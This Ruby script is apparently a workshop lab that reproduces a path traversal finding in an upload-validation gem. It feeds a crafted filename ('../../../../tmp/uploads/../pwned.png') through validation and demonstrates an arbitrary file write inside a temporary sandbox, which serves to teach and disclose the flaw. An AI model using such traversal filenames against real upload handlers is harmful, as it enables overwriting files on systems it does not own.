# frozen_string_literal: true

# Lab 2 - Finding #1 reproduction.
#
#   Path traversal in safe_filename/storage_path leads to arbitrary file write.
#
# Run this from the repository root:
#
#   bundle exec ruby -Ilib labs/lab2/reproduce_finding_1.rb
#
# You are hunting exactly two facts. Write them down before anyone argues about
# severity:
#
#   FACT 1 - does validation accept the upload?
#   FACT 2 - where does the resolved write target actually land?
#
# Part A does pure path arithmetic and touches no files at all. Part B performs
# a real write, entirely inside a throwaway temporary directory that is deleted
# when the script exits. Nothing outside that directory is created or modified.

require "upload_guard_workshop"
require "tmpdir"

# Stand-in for ActionDispatch::Http::UploadedFile. Every attribute below is
# multipart request metadata, which means the person uploading controls it.
FakeUpload = Struct.new(:original_filename, :content_type, :byte_size, :body) do
  alias_method :size, :byte_size

  def read = body
end

# Note the .png on the end. The logo guard's extension allowlist still has to
# pass, so the traversal has to carry an allowed extension along with it.
# Curious what happens without one? See labs/lab2/reproduce_findings_2_and_3.rb.
TRAVERSAL_FILENAME = "../../../../tmp/uploads/../pwned.png"
REPORT_BASE_DIR = "/srv/uploads/company_logos"

def section(title)
  puts
  puts "== #{title} =="
end

def contained?(path, base_dir)
  File.expand_path(path).start_with?(File.expand_path(base_dir) + File::SEPARATOR)
end

guard = UploadGuard::Guard.logo
upload = FakeUpload.new(TRAVERSAL_FILENAME, "image/png", 10, "x")

puts "Finding #1 - path traversal in safe_filename/storage_path"
puts "Uploaded filename:     #{TRAVERSAL_FILENAME.inspect}"
puts "Declared content type: image/png"
puts "Host's intended dir:   #{REPORT_BASE_DIR}"

section "FACT 1 - does validation accept this upload?"
result = guard.validate(upload)
puts "validate.accepted? => #{result.accepted?}"
puts "validate.errors    => #{result.errors.inspect}"

section "FACT 2 - where does the write target land? (no files touched)"
storage_path = guard.storage_path(REPORT_BASE_DIR, upload)
puts "safe_filename    => #{guard.safe_filename(upload).inspect}"
puts "storage_path     => #{storage_path.inspect}"
puts "expanded         => #{File.expand_path(storage_path).inspect}"
puts "inside base_dir? => #{contained?(storage_path, REPORT_BASE_DIR)}"

section "Part B - end-to-end write, sandboxed in a temp directory"
Dir.mktmpdir("upload_guard_lab2") do |sandbox|
  base_dir = File.join(sandbox, "uploads", "company_logos")
  FileUtils.mkdir_p(base_dir)

  # Two levels up from base_dir, so the escape stays inside the sandbox.
  escape = FakeUpload.new("../../pwned.png", "image/png", 12, "OWNED_BYTES\n")
  sandbox_guard = UploadGuard::Guard.logo

  if sandbox_guard.validate(escape).accepted?
    # This mirrors examples/rails_controller.rb:35 exactly - the caller pattern
    # this gem ships in its own examples directory.
    path = sandbox_guard.storage_path(base_dir, escape)
    File.binwrite(path, escape.read)

    puts "intended base_dir => #{base_dir}"
    puts "actually wrote to => #{File.expand_path(path)}"
    puts "escaped base_dir? => #{!contained?(path, base_dir)}"
    puts "bytes on disk     => #{File.read(File.expand_path(path)).inspect}"
  else
    puts "Upload was rejected, so nothing was written."
  end
end

section "Verdict"
puts "Validation accepted the upload, and storage_path resolved to a location"
puts "outside the directory the host asked for. A host following the gem's own"
puts "example (examples/rails_controller.rb:35) writes attacker bytes there."
puts
puts "Accepted is not the same as safe."
